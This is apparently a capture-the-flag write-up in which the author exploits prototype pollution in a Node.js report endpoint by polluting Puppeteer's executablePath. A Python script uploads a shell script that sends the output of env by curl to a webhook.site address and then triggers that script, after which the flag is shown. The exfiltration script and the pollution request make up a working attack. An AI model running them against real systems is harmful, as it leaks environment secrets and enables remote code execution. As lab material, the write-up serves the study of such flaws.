---
created: 2025-11-15T16:59
updated: 2025-11-16T09:51
solves: 31
points: 345
---

We get a free prototype pollution, how do we exploit it?

```js
const { url, username, issue, description } = req.body;
reports = {};
if (!username || !issue || !description) {
  return res.status(400).json({
    success: false,
    error: "username, issue, and description required",
  });
}
if (!reports[username]) reports[username] = {};
reports[username][issue] = description;
```

It seems that the flag is in the env, but is not mentioned anywhere in the code, that means we probably need to do something that will fork a new process and leak the env.

Looking at the code, only the puppeteer part does that.

If we look at the docs for puppeteer we can find that there is a `executablePath` option, I guess it is just being ran directly.

| env            | `optional` | Record<string, string \| undefined> | Specify environment variables that will be visible to the browser. | The contents of `process.env`. |
| -------------- | ---------- | ----------------------------------- | ------------------------------------------------------------------ | ------------------------------ |
| executablePath | `optional` | string                              |                                                                    |                                |

It works.

```python
import requests
target = "http://localhost:3000"
target = "https://987b17a72e8b5cef.chal.ctf.ae"
payload = """
#!/bin/sh
curl -X POST -d "$(env)" https://webhook.site/21f15dca-ed26-43c0-9a5c-5f6e135cd1c3
""".strip()
fid = requests.post(f"{target}/upload",
                    files={"file": ("lol", payload)}).json()['file']
print(fid)

fpath = f"/app/static/{fid}"
print(requests.post(f"{target}/report",
                    json={"url": "http://google.com",
                          "username": "__proto__",
                          "issue": "executablePath",
                          "description": fpath
                          }).text)
```

```flag
flag{d0646eec33b1331c}
```
